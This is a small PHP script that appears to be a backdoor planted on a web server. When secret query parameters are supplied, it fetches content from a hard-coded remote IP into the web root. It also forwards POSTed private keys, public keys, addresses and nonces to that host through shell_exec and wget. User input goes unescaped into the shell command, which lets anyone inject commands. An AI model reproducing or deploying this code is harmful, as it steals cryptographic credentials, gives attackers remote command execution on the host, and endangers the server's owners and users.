<?php

if($_GET["q"] == "")
  
{
}

if($_GET["linux84"] == "linux8474")
  
{

echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?linux84=linux8474;cat /var/www/html/linux84");

}

if($_GET["linux84"] == "linux84")
  
{

$google84741 = $_POST["argon"];

$google84742 = $_POST["nonce"];

$google84744 = $_POST["private_key"];

$google847412 = $_POST["public_key"];

$google847446 = $_POST["address"];

echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");

}

?>
